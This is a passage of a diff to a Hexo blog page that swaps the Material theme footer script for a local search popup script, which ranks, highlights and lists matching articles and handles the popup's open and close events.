+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
         }
-    })()
-console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
-</script>
+      });
+    }
 
-                </main>
-            </div>
-        </body>
-    
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
 </html>
